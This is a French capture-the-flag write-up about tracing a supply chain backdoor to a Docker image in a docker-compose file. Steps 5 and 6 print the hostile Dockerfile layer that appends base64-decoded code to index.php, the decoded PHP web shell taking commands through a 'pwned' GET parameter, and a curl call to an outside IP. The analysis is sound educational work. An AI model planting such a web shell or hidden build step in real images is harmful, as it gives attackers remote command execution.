# Supply Chain Attack - Docker - Write-up

## Introduction 🛠️

Ah, le **stagiaire DevOps**… Il a déployé un serveur web en utilisant Docker, et tout semblait parfaitement fonctionner. Sauf que des alertes de sécurité ont commencé à apparaître, même après plusieurs réinstallations du serveur. Intriguant, non ? 🤔

Votre mission, si vous l’acceptez : trouver **la source du problème** et comprendre ce qui cloche dans cette histoire de Docker. On parie que ce n’est pas un simple bug ?

---

## Étape 1 : Décompression et exploration des fichiers 🔍

La première étape consiste à extraire l'archive `ch36.zip` pour voir ce qu’on a sous le capot. Voici la commande pour décompresser l’archive :

```bash
$ unzip ch36.zip
```

Cela nous donne le dossier `awesome_webserver/`, qui contient l’arborescence suivante :


```markdown
awesome-webserver/
|_ Dockerfile
|_ docker-compose.yml
|_ nginx/
    |_ site.conf
    |_ site/
        |_ index.js
        |_ ...
|_ README.md
```

On commence par inspecter le contenu. Le code du site et la configuration de Nginx ne révèlent rien de suspect pour le moment. Il est donc temps de se concentrer sur la partie **Docker** .


---



## Étape 2 : Analyser le Dockerfile 🐳 

Le Dockerfile utilise **Debian**  comme image de base, ce qui semble assez standard. On n'y trouve rien d’anormal pour l’instant. Le Dockerfile est tout à fait classique :


```Dockerfile
FROM debian:latest
```


Pas de surprises là-dessus, donc passons à l'étape suivante !



---


Étape 3 : Inspecter le `docker-compose.yml` 📄
Le vrai problème semble se cacher dans le fichier `docker-compose.yml`. Ce fichier définit plusieurs services, dont voici les images Docker utilisées :
 
- `nginx:latest`
 
- `bodsch/docker-jolokia:1.6.0`
 
- `bitnami/phpmyadmin:latest`
 
- `hello-world:linux`
 
- `apachetwo/apache2_php:1.5`
 
- `cloudesire/tomcat:8-jre8`
 
- `willfarrell/autoheal`

Certaines images sont clairement sûres, comme **nginx**  et **bitnami**  (vérifié sur DockerHub). Cependant, quelques images semblent un peu suspectes :
 
- `bodsch/docker-jolokia:1.6.0`
 
- `apachetwo/apache2_php:1.5`
 
- `cloudesire/tomcat:8-jre8`
 
- `willfarrell/autoheal`



---



## Étape 4 : Vérification des mises à jour et analyse des images suspectes 🕵️‍♂️ 


Pour chaque image suspecte, on vérifie l’historique des mises à jour sur le registre Docker.

 
- **docker-jolokia:1.6.0**  et **tomcat:8-jre8**  ont été mises à jour il y a 2 et 4 ans respectivement. On peut donc **exclure**  ces deux-là pour un éventuel code malveillant, car elles sont probablement à jour.


Nous nous concentrons donc sur les deux dernières images suspectes :

 
- `apachetwo/apache2_php:1.5`
 
- `willfarrell/autoheal`



---


Étape 5 : Inspection de l’image `apachetwo/apache2_php:1.5` 🧐
Là, on trouve quelque chose d’intéressant. En analysant l’étape 17 du Dockerfile de l’image `apachetwo/apache2_php:1.5`, on remarque une chaîne en **base64** . Voilà qui mérite un peu plus d'attention.


```bash
/ bin/sh -c echo $(echo "[FLAG CACHÉ]" | base64 -d) >> index.php
```


En décodant cette chaîne, on obtient une commande PHP qui ressemble à ceci :



```php
<?php system($_GET[base64_decode('cHduZWQ=')]);shell_exec(base64_decode('[FLAG CACHÉ]'));?>
```



---



## Étape 6 : Décodage et découverte du flag 🎁 


Décodons les deux autres chaînes base64 que l'on trouve dans la commande PHP.

 
2. **Décodage de la première chaîne**  :



```bash
$ echo "cHduZWQ=" | base64 -d
pwned
```

 
2. **Décodage de la seconde chaîne**  :



```bash
$ echo "[FLAG CACHÉ]" | base64 -d
curl --user-agent 'REDACTED' http://198.51.100.42/
```

La commande PHP permet à un attaquant d’exécuter des commandes via la requête GET avec le paramètre `pwned`. Cela permet à l’attaquant de déclencher un **cURL**  vers un serveur malveillant (ici, `http://198.51.100.42/`), probablement pour exfiltrer des informations ou pour maintenir l'accès au système.


---



## Conclusion 🎉 

Et voilà ! Après avoir analysé les images suspectes, nous avons découvert que l’image `apachetwo/apache2_php:1.5` contenait un **code malveillant** . En particulier, une commande PHP permet d'exécuter des requêtes GET, ce qui permet à un attaquant de faire des appels système à distance via une porte dérobée. 😱
Le **flag**  a été récupéré, et nous avons trouvé l'attaquant qui utilise un simple cURL pour pirater la machine. Comme quoi, même Docker ne protège pas contre une **supply chain attack**  malveillante. 🚨
**Leçon à retenir :**  Toujours vérifier les images Docker que vous utilisez, et n’oubliez pas qu’une simple chaîne en base64 peut cacher un énorme risque pour votre sécurité ! 🔐

